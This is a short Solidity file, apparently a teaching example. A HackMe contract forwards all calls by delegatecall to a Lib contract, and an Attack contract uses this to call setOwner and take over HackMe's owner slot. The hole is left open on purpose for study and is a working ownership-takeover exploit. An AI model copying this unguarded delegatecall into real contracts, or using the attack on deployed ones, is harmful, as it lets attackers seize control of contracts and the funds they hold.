// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;



contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner=msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function setOwner() public {
        owner = msg.sender;
    }
}


contract Attack {
    address public hackMe;

    constructor(address _hackMe){
        hackMe = _hackMe;
    }

    function attack() public {
        // setOwner() doesn't exist in hackMe contract
        hackMe.call(abi.encodeWithSelector(Lib.setOwner.selector));
    }
}
